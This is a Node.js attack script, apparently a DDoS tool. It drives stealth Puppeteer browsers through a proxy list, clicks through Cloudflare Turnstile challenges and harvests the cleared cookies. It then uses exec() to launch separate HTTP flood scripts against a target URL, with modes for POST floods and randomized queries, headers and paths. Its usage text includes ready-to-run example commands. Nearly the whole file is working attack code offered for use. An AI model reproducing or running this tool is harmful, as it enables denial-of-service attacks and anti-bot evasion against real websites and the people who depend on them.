const errorHandler = error => {
	console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
	const index = this.indexOf(item);
	if (index !== -1) {
		this.splice(index, 1);
	}
	return item;
}

const crypto = require("crypto");
const generateLargeData = () => crypto.randomBytes(1024 * 1024).toString('hex');
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const request = require("request");
const minimist = require("minimist");
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];
const gay = process.argv[7];
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
//const { spawn } = require("child_process");
const { exec } = require("child_process");
const colors = {
	COLOR_RED: "\x1b[31m",
	COLOR_GREEN: "\x1b[32m",
	COLOR_YELLOW: "\x1b[33m",
	COLOR_BLACK: "\x1b[30m",
	COLOR_BLUE: "\x1b[34m",
	COLOR_MAGENTA: "\x1b[35m",
	COLOR_CYAN: "\x1b[36m",
	COLOR_WHITE: "\x1b[37m",
	COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
	console.log(colorCode + text + colors.COLOR_RESET);
};
if (!targetURL || !threads || !proxyFile || !rates || !duration || !gay) {
  console.clear();
  colored(colors.COLOR_MAGENTA, `Browser method `);
  colored(colors.COLOR_RED, `node browser <url> <thread> <proxyfile> <rate> <time> true/false (true = bypass mode) + mode `);
  colored(colors.COLOR_GREEN,`Mode :
	 --post    : post mode for flood
	 --query   : random some query 
	 --exploit : random header
	 --path    : random path
	 --header  : add header for flood
	 --sleep   : delay flood
	`);
  colored(colors.COLOR_YELLOW, `Try : node browser https://@tcp_spoofed.sex/ 7 fast.txt 32 500 true`);
  colored(colors.COLOR_YELLOW, `Try : node browser https://@tcp_spoofed.sex/ 7 fast.txt 32 500 true --query true --exploit true --sleep true `);
  process.exit(1);
}
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const args = minimist(process.argv.slice(2));
args.exploit     
args.sleep                  
args.path   
args.query
args.header 
args.post
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

function getCurrentTime() {
	const now = new Date();
	const gmt7Offset = 7 * 60 * 60 * 1000;
	const localTime = new Date(now.getTime() + gmt7Offset);
	return localTime.toISOString().substr(11, 8); // Get HH:MM:SS
}

async function detectChallenge(browserProxy, page) {
	const title = await page.title();
	const content = await page.content();
	const timestamp = getCurrentTime();
	if (title === "Attention Required! | Cloudflare") {
		throw new Error(`${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m Proxy blocked`);
	}
	if (content.includes("challenge-platform") === true) {
		colored(colors.COLOR_BLUE, `${timestamp} \x1b[33m Browser founded challenge\x1b[42m\x1b[0m ${browserProxy} \x1b[0m`);
		try {
			await sleep(15);
			const elements = await page.$$('[name="cf-turnstile-response"]');
			if (elements.length <= 0) {
				const coordinates = await page.evaluate(() => {
					let coordinates = [];
					document.querySelectorAll("div").forEach((item) => {
						try {
							let itemCoordinates = item.getBoundingClientRect();
							let itemCss = window.getComputedStyle(item);
							if (
								itemCss.margin == "0px" &&
								itemCss.padding == "0px" &&
								itemCoordinates.width > 290 &&
								itemCoordinates.width <= 310 &&
								!item.querySelector("*")
							) {
								coordinates.push({
									x: itemCoordinates.x,
									y: item.getBoundingClientRect().y,
									w: item.getBoundingClientRect().width,
									h: item.getBoundingClientRect().height,
								});
							}
						} catch (err) { }
					});

					if (coordinates.length <= 0) {
						document.querySelectorAll("div").forEach((item) => {
							try {
								let itemCoordinates = item.getBoundingClientRect();
								if (
									itemCoordinates.width > 290 &&
									itemCoordinates.width <= 310 &&
									!item.querySelector("*")
								) {
									coordinates.push({
										x: itemCoordinates.x,
										y: item.getBoundingClientRect().y,
										w: item.getBoundingClientRect().width,
										h: item.getBoundingClientRect().height,
									});
								}
							} catch (err) { }
						});
					}
					return coordinates;
				});
				for (const item of coordinates) {
					try {
						let x = item.x + 30;
						let y = item.y + item.h / 2;
						await page.mouse.click(x, y);
					} catch (err) { }
				}
			}
			for (const element of elements) {
				try {
					const parentElement = await element.evaluateHandle(
						(el) => el.parentElement
					);
					const box = await parentElement.boundingBox();
					let x = box.x + 30;
					let y = box.y + box.height / 2;
					await page.mouse.click(x, y);
				} catch (err) { }
			}
		} finally {
			await sleep(15);
			return;
		}
	}
	colored(colors.COLOR_CYAN, `${timestamp} \x1b[46m | \x1b[0m ${browserProxy} \x1b[46m | \x1b[0m \x1b[40m No challenge detected \x1b[0m`);
	await sleep(10);
	return;
}

const userAgents = [
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4',
	'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 Edg/126.0.0.0",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 Edg/125.0.0.0",
	'Mozilla/5.0 (Linux; Android 14; SM-S721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-X920N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-X826N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F741N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-F958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-A042M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	
	'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',

	'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
	'Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0',
	'Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0',
	'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
	'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',

];

function detectProxyFormat(proxyString) {
    const formats = {
        "username:password@host:port": /^(\w+):(\w+)@([\w.-]+):(\d+)$/,
        "host:port:username:password": /^([\w.-]+):(\d+):(\w+):(\w+)$/,
        "host:port": /^([\w.-]+):(\d+)$/
    };

    for (const [format, regex] of Object.entries(formats)) {
        const match = proxyString.match(regex);
        if (match) {
            let username = "";
            let password = "";
            let host = "";
            let port = "";

            switch (format) {
                case "username:password@host:port":
                    username = match[1];
                    password = match[2];
                    host = match[3];
                    port = match[4];
                    break;
                case "host:port:username:password":
                    host = match[1];
                    port = match[2];
                    username = match[3];
                    password = match[4];
                    break;
                case "host:port":
                    host = match[1];
                    port = match[2];
                    break;
            }

            return `${username || "myUsername"}:${password || "myPassword"}@${host}:${port}`;
        }
    }

    return null; 
}
async function openBrowser(targetURL, browserProxy) {
	const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
	const promise = async (resolve, reject) => {
		let username = "";
		let password = "";

		const proxyMatch = browserProxy.match(/^(?:(.*?):(.*?)@)?([\w.-]+):(\d+)$/);
        if (proxyMatch) {
            username = proxyMatch[1] || ""; // Username if available
            password = proxyMatch[2] || ""; // Password if available
            host = proxyMatch[3]; // Host
            port = proxyMatch[4]; // Port
        } else {
            reject("Invalid proxy format. Expected format: username:password@host:port or host:port");
            return;
        }
        const proxyServer = `${host}:${port}`;
		const options = {
			headless: "new",
			ignoreHTTPSErrors: true,
			args: [
				"--proxy-server=http://" + proxyServer,
				"--no-sandbox",
				"--no-first-run",
				"--ignore-certificate-errors",
				"--disable-extensions",
				"--test-type",
				"--user-agent=" + userAgent
			]
		};
		const browser = await puppeteer.launch(options);
		try {

			const [page] = await browser.pages();
			if (username && password){
				await page.authenticate({ username, password });
			}
			const client = page._client();

page.on("framenavigated", (frame) => {
	if (frame.url().includes("challenges.cloudflare.com")) {
		console.log("[!] Cloudflare challenge frame found.");
	}
});

			page.setDefaultNavigationTimeout(60 * 1000);
			const userAgent = await page.evaluate(function () {
				return navigator.userAgent;
			});

			await page.goto(targetURL, {
				waitUntil: "domcontentloaded"
			});
			await detectChallenge(browserProxy, page, reject);
			const title = await page.title();
			const cookies = await page.cookies(targetURL);
			resolve({
				title: title,
				browserProxy: browserProxy,
				cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
				userAgent: userAgent
			});

		} catch (exception) {
		} finally {
			await browser.close();
		}
	};
	return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
	browserProxy = detectProxyFormat(browserProxy);

	if (retries === COOKIES_MAX_RETRIES) {
		const currentTask = queue.length();
		done(null, { task, currentTask });
	} else {
		
		try {
			const response = await openBrowser(targetURL, browserProxy);

			if (response) {
				
				if (response.title === "Just a moment...") {
					console.log("\x1b[31mBROWSER : " + browserProxy + " - failed \x1b[37m ");
					await startThread(targetURL, browserProxy, task, done, retries + 1);
					return;
				}

		const cookies =
"------------------------------------------------------------------------------------------------------------" +
					"\n\x1b[36m TARGET INFORMATION : \x1b[0m" +
					"\n\x1b[32m [Tittle] : \x1b[36m" + response.title +
					"\n\x1b[32m [Target] : \x1b[36m" + targetURL +
					"\n\x1b[32m [Proxy] : \x1b[0m" + response.browserProxy +
					"\n\x1b[32m [User-Agent] : \x1b[0m" + response.userAgent +
					"\n\x1b[31m [Cookie-Solved] : \x1b[37m" + response.cookies +
"\n ----------------------------------------------------------------------------------------------------------"

				console.log(cookies);
if (gay === 'true') {
  const cmd = `node flood.js ${targetURL} ${duration} ${threads} ${response.browserProxy} ${rates} "${response.cookies}" "${response.userAgent}" --query ${args.query || false}  --post ${args.post || false} --status true --cookie ${args.exploit || false}`;
  console.log(">> RUNNING bypass mode:\n" + cmd);
  exec(cmd, (err, stdout, stderr) => {
  //  if (err) return console.error(`error: ${err}`);
    if (stdout) console.log(`stdout:\n${stdout}`);
    if (stderr) console.error(`stderr:\n${stderr}`);
  });
}
else  {
  const cmd = `node floodiu.js ${targetURL} ${duration} ${rates} ${threads} ${proxyFile} --proxy ${response.browserProxy} --cookie ${response.cookies} --ua "${response.userAgent}" --http 1 --exploit ${args.exploit || false} --sleep ${args.sleep || false} --header ${args.header || false} --query ${args.query || false} --path ${args.path || false} --debug true`;
  console.log(">> RUNNING flood http1 mode:\n" + cmd);
  exec(cmd, (err, stdout, stderr) => {
 //   if (err) return console.error(`error: ${err}`);
    if (stdout) console.log(`stdout:\n${stdout}`);
    if (stderr) console.error(`stderr:\n${stderr}`);
  });
} 
}
			await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
		} catch (exception) {
			colored(colors.COLOR_RED, exception);
			await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
		}
	}

	
}
var queue = async.queue(function (task, done) {
	startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
	for (let i = 0; i < proxies.length; i++) {
		const browserProxy = randList(proxies);
		proxies.splice(proxies.indexOf(browserProxy), 1);
		queue.push({ browserProxy: browserProxy });
	} 
	await sleep(duration);
	queue.kill
}

main();
